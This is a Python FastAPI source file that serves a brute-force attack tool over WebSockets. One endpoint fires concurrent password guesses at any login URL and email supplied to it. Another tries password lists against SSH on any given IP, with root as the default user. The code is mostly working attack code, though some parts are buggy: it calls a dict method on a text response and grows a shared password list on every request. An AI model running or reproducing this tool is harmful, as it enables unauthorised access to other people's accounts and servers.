from fastapi import FastAPI, WebSocket, HTTPException , WebSocketDisconnect
from pydantic import BaseModel
import asyncio
import aiohttp
import paramiko
import json


app = FastAPI()

class LoginData(BaseModel):
    login_url: str
    email: str

class SSHData(BaseModel):
    username : str = 'root'
    passwords : str
    ipAddress : str

# Load passwords from a file or db
passwords = [f"Test123!"+str(i) for i in range(10)] # Replace with your 100,000 common passwords data

async def attempt_login(session, login_url, email, password, websocket):
    payload = {
        "email": email,
        "password": password
    }
    headers = {
        "Content-Type": "application/json"
    }
    
    async with session.post(login_url, json=payload, headers=headers) as response:

        data = await response.text()
        if response.status == 200:
            if data.get("success", False):  # Adjust based on the response structure
                await websocket.send_text(f"Password found: {password}, statusCode: {response.status}")
                return password, True , response.status
        await websocket.send_text(f"Password tried: {password} , statusCode: {response.status}")
        return password, False , response.status

async def login_handler(websocket: WebSocket):
    await websocket.accept()
    try:
        data = await websocket.receive_json()
        login_data = LoginData(**data)
        login_url = login_data.login_url
        email = login_data.email
        print(login_url)

        # Validate URL
        if not login_url.startswith("http://") and not login_url.startswith("https://"):
            raise HTTPException(status_code=400, detail="Invalid URL")

        async with aiohttp.ClientSession() as session:
            tasks = []
            for password in passwords:
                task = attempt_login(session, login_url, email, password, websocket)
                tasks.append(task)

            # Concurrently execute all tasks
            results = await asyncio.gather(*tasks)

            # Check if any password was found
            for password, success , data in results:
                if success:
                    break
            else:

                await websocket.send_text("No valid password found.")
    except Exception as e:
        await websocket.send_text(f"An error occurred: {str(e)}")
    finally:
        await websocket.close()


# website bute-force
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await login_handler(websocket)



# ssh brute force
async def ssh_connect(username: str, password: str, ip_address: str, websocket: WebSocket):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip_address, username=username, password=password, timeout=5)
        await websocket.send_json({'data' : f"SSH login successful with password: {password}" })
    except paramiko.AuthenticationException:
        await websocket.send_json({'data':f"WRONG PASSWORD: {password}"})
    except Exception as e:
        print('ERROR IN SSH CONNECT FUNC ...,' , e)
        await websocket.send_json({'data': f"WRONG PASSWORD: {password}"})
    finally:
        client.close()
    return True

@app.websocket("/ws/ssh")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            data = await websocket.receive_text()
            print(data)
            ssh_data = json.loads(data)
            username = ssh_data['username']
            ip_address = ssh_data['ipAddress']
            try:
                passwords.extend(ssh_data['passwords'].split(','))
            except Exception as e:
                print( 'error in password list conversion', str(e))

            for password in passwords[::-1]: # optimize this if password has large it could be bottleneck
                if len(password) :
                    await ssh_connect(username, password, ip_address, websocket)
            await websocket.send_json({'data': f"No Password Found"})
    except WebSocketDisconnect:
        print("WebSocket disconnected")
    except Exception as e:
        print('ERROR IN WS SSH ' , e)
        await websocket.send_text(f"An error occurred: {str(e)}")
    finally:
        await websocket.close()